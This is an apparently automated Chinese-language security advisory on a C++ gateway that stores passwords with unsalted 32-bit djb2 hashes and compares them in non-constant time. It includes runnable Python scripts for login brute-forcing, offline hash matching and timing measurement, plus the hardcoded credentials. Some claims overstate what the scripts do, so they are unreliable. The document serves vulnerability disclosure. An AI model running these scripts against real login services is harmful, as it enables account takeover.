# VULN-SEC-CPP-CRYPTO-AUTH-002: 认证模块使用 djb2 非密码学哈希存储密码导致暴力破解和彩虹表攻击

**严重性**: Critical | **CWE**: CWE-328 (Reversible One-Way Hash) | **置信度**: 85/100
**位置**: `src/user_store.cpp:12-18` @ `UserStore::weakHash`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: crypto
**Source/Sink**: user_password → weak_hash_comparison
**规则/证据来源**: c_cpp.crypto.weak_hash / llm

---

## 1. 漏洞细节

`UserStore::weakHash()` 函数使用 djb2 算法对用户密码进行"哈希"处理后存储和比对。djb2 是 Dan Bernstein 设计的一种**非密码学哈希函数**，最初用于字符串哈希表查找，其设计目标是分布均匀和计算快速，**完全不具备密码学安全性**。

该实现存在以下严重缺陷：

1. **输出空间极小**：djb2 输出为 32 位无符号整数（最大约 43 亿个值），在现代硬件上可在数分钟内穷举全部可能值。
2. **无盐值（No Salt）**：相同密码始终产生相同哈希值，攻击者可预先构建彩虹表（Rainbow Table），一次性破解所有用户密码。
3. **无密钥拉伸（No Key Stretching）**：未使用 bcrypt、scrypt、Argon2 或 PBKDF2 等密码学安全的密码哈希算法，计算成本极低。
4. **时序攻击（Timing Attack）**：`authenticate()` 函数使用 `==` 运算符进行字符串比较，非恒定时间比较，攻击者可通过响应时间差异逐字节推断哈希值。

### 证据摘要

- 触发源: user_password（用户通过 POST /login 提交的密码参数）
- 危险点: weak_hash_comparison（djb2 哈希结果与存储哈希的字符串等值比较）
- 已检查的清洗/缓解: 无盐值、无密钥拉伸、无 bcrypt/scrypt/argon2/PBKDF2、比较使用 == 运算符（存在时序攻击风险）
- 关键证据:
  - `weakHash()` 函数体（第 12-18 行）明确实现 djb2 算法，初始值 5381，迭代公式 `value = ((value << 5) + value) + ch`
  - 输出为 `std::to_string(value)`，即 32 位无符号整数的十进制字符串表示
  - `authenticate()` 第 25 行直接使用 `==` 比较哈希字符串
  - 构造函数（第 7-9 行）使用 `weakHash()` 存储硬编码用户密码的哈希值

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 6-26)

```cpp
// 构造函数：使用 weakHash 存储硬编码用户密码
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};      // 行 7
  users_["operator"] = {"operator", weakHash("op-password"), false}; // 行 8
  users_["admin"] = {"admin", weakHash("admin123"), true};          // 行 9 — 管理员账户!
}

// 漏洞核心：djb2 非密码学哈希用于密码存储
std::string UserStore::weakHash(const std::string& password) const {  // 行 12
  unsigned int value = 5381;                                          // 行 13: djb2 初始值
  for (char ch : password) {                                          // 行 14
    value = ((value << 5) + value) + static_cast<unsigned char>(ch);  // 行 15: djb2 迭代
  }
  return std::to_string(value);                                       // 行 17: 32位整数转字符串
}                                                                     // 行 18

// 认证函数：使用 == 比较哈希值（存在时序攻击）
bool UserStore::authenticate(const std::string& username,
                             const std::string& password) const {     // 行 20
  auto user = users_.find(username);                                  // 行 21
  if (user == users_.end()) {                                         // 行 22
    return false;                                                     // 行 23
  }
  return user->second.passwordHash == weakHash(password);             // 行 25: == 比较，非恒定时间
}
```

**逐段分析**：

- **第 7-9 行**：构造函数中使用 `weakHash()` 对硬编码密码进行哈希并存储。管理员账户 `admin` 的密码 `admin123` 经 djb2 哈希后存储为字符串 `"407908580"`。
- **第 12-18 行**：`weakHash()` 实现标准 djb2 算法。32 位无符号整数溢出行为在 C++ 中是定义良好的（模 2^32），但输出空间仅约 43 亿个值。
- **第 25 行**：`authenticate()` 使用 `==` 运算符比较两个 `std::string`。`std::string::operator==` 通常会在发现第一个不匹配字符时立即返回，导致比较时间与匹配前缀长度成正比，构成时序侧信道。

## 3. 完整攻击链路

```
[入口点] POST /login handler @ src/main.cpp:40
  ↓ HTTP 请求参数 "user" 和 "password" 由 queryValue() 提取（main.cpp:41-42）
[参数提取] queryValue(request, "password") @ src/main.cpp:42
  ↓ 用户提交的明文密码传递给 users.authenticate()
[认证调用] users.authenticate(username, password) @ src/main.cpp:45
  ↓ authenticate() 内部调用 weakHash(password)
[弱哈希计算] weakHash(password) @ src/user_store.cpp:25 → 12-17
  ↓ djb2 计算 32 位哈希，转为十进制字符串
[哈希比较] user->second.passwordHash == weakHash(password) @ src/user_store.cpp:25
  ↓ 字符串 == 比较（时序泄露）
[认证结果] 返回 true/false → 成功则签发 session token（main.cpp:49-51）
```

**链路详细说明**：

1. **入口点**（`main.cpp:40`）：`POST /login` 路由注册在 HTTP 服务器上，接受来自不可信网络的请求。无需任何前置认证。
2. **参数提取**（`main.cpp:41-42`）：`queryValue()` 从 `request.query` map 中提取 `user` 和 `password` 参数，无任何过滤或长度限制。
3. **认证调用**（`main.cpp:45`）：明文密码直接传递给 `UserStore::authenticate()`，中间无任何转换或验证。
4. **弱哈希计算**（`user_store.cpp:12-17`）：`weakHash()` 对明文密码执行 djb2 哈希，输出 32 位无符号整数的十进制字符串。
5. **哈希比较**（`user_store.cpp:25`）：使用 `==` 运算符比较存储的哈希值与计算得到的哈希值。比较操作非恒定时间，存在时序侧信道。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。任何能够访问该 HTTP 服务端口（默认 8080）的网络攻击者均可发起攻击，无需任何身份凭证。

**攻击向量**: 通过网络向 `POST /login` 端点发送 HTTP 请求。攻击者可选择以下攻击路径：

- **路径 A — 直接暴力破解密码**：对已知用户名（如 `admin`），枚举常见密码字典，计算每个密码的 djb2 哈希，通过登录接口验证是否匹配。
- **路径 B — 哈希值逆向**：如果攻击者通过其他漏洞（如信息泄露）获取了存储的哈希值（如 `"407908580"`），可在本地离线穷举所有 32 位空间，瞬间还原原始密码。
- **路径 C — 时序攻击**：通过精确测量登录响应时间，逐字节推断存储的哈希值字符串，然后离线逆向。

**利用难度**: **低**

### 攻击步骤（路径 A — 直接暴力破解管理员密码）

1. 攻击者发现目标服务运行在 `target:8080`，存在 `POST /login` 端点。
2. 攻击者尝试用户名 `admin`（常见管理员用户名），并使用密码字典逐一尝试。
3. 由于 djb2 计算极快（无密钥拉伸），攻击者可在本地高速计算候选密码的 djb2 哈希。
4. 当尝试密码 `admin123` 时，`djb2("admin123") = 407908580`，与存储的哈希值匹配，认证成功。
5. 攻击者获得管理员 session token，可进一步访问管理功能。

### 攻击步骤（路径 B — 离线哈希逆向）

1. 攻击者通过某种方式获取到存储的哈希值（如读取源码、内存转储、信息泄露漏洞）。
2. 已知 `admin` 的哈希为 `"407908580"`。
3. 攻击者在本地穷举 0 到 2^32-1 的所有可能输入，计算 djb2 哈希，找到碰撞。
4. 由于 32 位空间仅约 43 亿个值，现代 CPU 可在数秒到数分钟内完成全部穷举。

## 5. 攻击条件

| 条件类型   | 要求               | 说明                                                                 |
| ---------- | ------------------ | -------------------------------------------------------------------- |
| 网络可达性 | 需要               | 攻击者需要能够访问 HTTP 服务端口（默认 8080），无 TLS 加密            |
| 认证要求   | 无需认证           | `POST /login` 端点公开可访问，无需任何前置认证                       |
| 配置依赖   | 无特殊配置要求     | 服务默认启动即注册 `/login` 路由，无开关控制                         |
| 环境依赖   | 无特殊环境要求     | 任何能发送 HTTP 请求的客户端均可利用                                 |
| 速率限制   | 无                 | 代码中未见任何请求速率限制或账户锁定机制，允许无限制暴力破解         |
| 时序条件   | 时序攻击需低延迟   | 时序攻击路径需要较低的网络延迟以精确测量响应时间差异                 |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                     |
| -------- | ---- | ---------------------------------------------------------------------------------------- |
| 机密性   | 高   | 所有用户密码可被暴力破解或彩虹表还原，导致凭据完全泄露                                   |
| 完整性   | 高   | 攻击者获取管理员凭据后可完全控制系统，修改数据、配置和文件                               |
| 可用性   | 高   | 攻击者获取管理员权限后可删除数据、关闭服务或篡改系统行为，导致服务不可用                 |

**影响范围**: **全局影响**。管理员账户 `admin` 使用弱哈希保护，一旦被破解，攻击者获得完整管理员权限。此外，由于无盐值，所有使用相同密码的用户账户会同时被攻破。如果用户在其他系统中复用相同密码，影响可扩展到外部系统（凭据填充攻击）。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权不得用于攻击他人系统。

### PoC 1: 计算已知密码的 djb2 哈希并验证登录

```python
#!/usr/bin/env python3
"""
PoC: 验证 djb2 弱哈希导致的密码暴力破解漏洞
仅供安全测试使用 — VULN-SEC-CPP-CRYPTO-AUTH-002
"""
import requests
import sys

def djb2(password: str) -> str:
    """复现 UserStore::weakHash() 的 djb2 实现"""
    value = 5381
    for ch in password:
        value = ((value << 5) + value + ord(ch)) & 0xFFFFFFFF
    return str(value)

# 常见密码字典（实际攻击中可使用更大的字典如 rockyou.txt）
PASSWORD_LIST = [
    "password", "123456", "admin", "admin123", "root",
    "letmein", "welcome", "monkey", "master", "qwerty",
    "wonderland", "op-password", "test", "guest", "changeme"
]

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
USERNAME = "admin"

print(f"[*] 目标: {TARGET}")
print(f"[*] 用户名: {USERNAME}")
print(f"[*] 开始暴力破解...\n")

for pwd in PASSWORD_LIST:
    h = djb2(pwd)
    print(f"  尝试密码: '{pwd}' -> djb2 = {h}")
    
    resp = requests.post(f"{TARGET}/login", params={
        "user": USERNAME,
        "password": pwd
    })
    
    if resp.status_code == 200:
        print(f"\n[+] 破解成功!")
        print(f"    用户名: {USERNAME}")
        print(f"    密码:   {pwd}")
        print(f"    djb2:   {h}")
        print(f"    响应:   {resp.text.strip()}")
        sys.exit(0)

print("\n[-] 字典中未找到匹配密码")
```

### PoC 2: 离线穷举 32 位哈希空间

```python
#!/usr/bin/env python3
"""
PoC: 离线逆向 djb2 32 位哈希值
仅供安全测试使用 — VULN-SEC-CPP-CRYPTO-AUTH-002

演示: 即使不知道原始密码，也可通过穷举全部 2^32 个可能值
在数分钟内找到哈希碰撞，还原原始密码。
"""
import string
import itertools

def djb2(password: str) -> int:
    value = 5381
    for ch in password:
        value = ((value << 5) + value + ord(ch)) & 0xFFFFFFFF
    return value

# 已知的存储哈希值（从源码或信息泄露获取）
TARGET_HASHES = {
    "578444851": "alice",
    "2573159652": "operator",
    "407908580": "admin"
}

print("[*] 开始对 djb2 32 位空间进行字典攻击...")
print(f"[*] 目标哈希: {TARGET_HASHES}\n")

# 阶段 1: 常见密码字典
common_passwords = [
    "password", "123456", "admin", "admin123", "root",
    "letmein", "welcome", "monkey", "master", "qwerty",
    "wonderland", "op-password", "test", "guest", "changeme",
    "password123", "abc123", "letmein123", "hello", "world"
]

found = set()
for pwd in common_passwords:
    h = str(djb2(pwd))
    if h in TARGET_HASHES:
        user = TARGET_HASHES[h]
        print(f"[+] 找到! 用户 '{user}': 密码 = '{pwd}', 哈希 = {h}")
        found.add(h)

if len(found) == len(TARGET_HASHES):
    print("\n[+] 所有密码已破解!")
else:
    remaining = {k: v for k, v in TARGET_HASHES.items() if k not in found}
    print(f"\n[*] 剩余未破解: {remaining}")
    print("[*] 可继续穷举更大的密码空间...")
```

### PoC 3: 时序攻击概念验证

```python
#!/usr/bin/env python3
"""
PoC: 利用 authenticate() 的 == 比较进行时序侧信道攻击
仅供安全测试使用 — VULN-SEC-CPP-CRYPTO-002

原理: std::string::operator== 在发现第一个不匹配字符时
立即返回 false，导致比较时间与匹配前缀长度成正比。
"""
import requests
import time
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
USERNAME = "admin"
KNOWN_HASH = "407908580"  # djb2("admin123")

print(f"[*] 目标: {TARGET}")
print(f"[*] 已知 admin 哈希: {KNOWN_HASH}")
print(f"[*] 通过时序攻击验证 == 比较的侧信道泄露\n")

# 构造不同前缀匹配长度的假密码（使 djb2 输出以不同前缀开头）
# 这里简化演示：测量不同密码的响应时间差异
test_passwords = ["a", "aa", "aaa", "admin", "admin1", "admin12", "admin123"]

for pwd in test_passwords:
    times = []
    for _ in range(100):  # 多次测量取平均
        start = time.perf_counter_ns()
        requests.post(f"{TARGET}/login", params={
            "user": USERNAME,
            "password": pwd
        })
        end = time.perf_counter_ns()
        times.append(end - start)
    
    avg_ns = sum(times) / len(times)
    print(f"  密码 '{pwd:12s}' -> 平均响应时间: {avg_ns/1e6:.3f} ms")

print("\n[*] 如果 'admin123' 的响应时间显著长于其他密码，")
print("    说明 == 比较泄露了匹配前缀长度信息。")
```

**使用说明**:

1. 确保目标服务运行在 `localhost:8080`（或指定目标地址）。
2. 运行 PoC 1 进行字典暴力破解：`python3 poc1_bruteforce.py http://target:8080`
3. 运行 PoC 2 进行离线哈希逆向：`python3 poc2_offline_reverse.py`
4. 运行 PoC 3 验证时序侧信道：`python3 poc3_timing_attack.py http://target:8080`

**预期结果**:

- PoC 1: 成功使用密码 `admin123` 登录 `admin` 账户，返回 `session=sess-admin-{timestamp}`。
- PoC 2: 从字典中还原出所有三个用户的明文密码：`alice:wonderland`、`operator:op-password`、`admin:admin123`。
- PoC 3: 正确密码 `admin123` 的响应时间应略长于错误密码（因为 `==` 比较需要遍历更多字符后才返回结果）。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ 或其他主流发行版)
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 构建工具: CMake 3.16+ 或 Make
- 依赖: 标准 C++ 库（无外部依赖）
- 测试工具: Python 3.8+、`requests` 库

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 使用 CMake 构建（如果项目提供 CMakeLists.txt）
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或使用 Makefile
make

# 或直接编译
g++ -std=c++17 -I include -o edge-gateway src/main.cpp src/user_store.cpp src/http_server.cpp src/file_cache.cpp src/diagnostics.cpp src/audit_log.cpp
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需额外配置文件。服务启动后在控制台输出 `edge-gateway listening on port 8080`。

### 验证步骤

1. 启动服务：`./edge-gateway`
2. 验证服务可达：`curl http://localhost:8080/health` → 预期返回 `ok`
3. 测试错误密码：`curl -X POST "http://localhost:8080/login?user=admin&password=wrong"` → 预期返回 401 `invalid credentials`
4. 测试正确密码：`curl -X POST "http://localhost:8080/login?user=admin&password=admin123"` → 预期返回 200 `session=sess-admin-{timestamp}`
5. 运行 PoC 脚本验证暴力破解可行性

### 预期结果

- 使用正确密码 `admin123` 可成功登录管理员账户
- 使用 PoC 1 的字典攻击可在毫秒级时间内破解所有用户密码
- 使用 PoC 2 的离线逆向可在数秒内从哈希值还原所有密码
- 无任何暴力破解防护机制（无速率限制、无账户锁定、无 CAPTCHA）
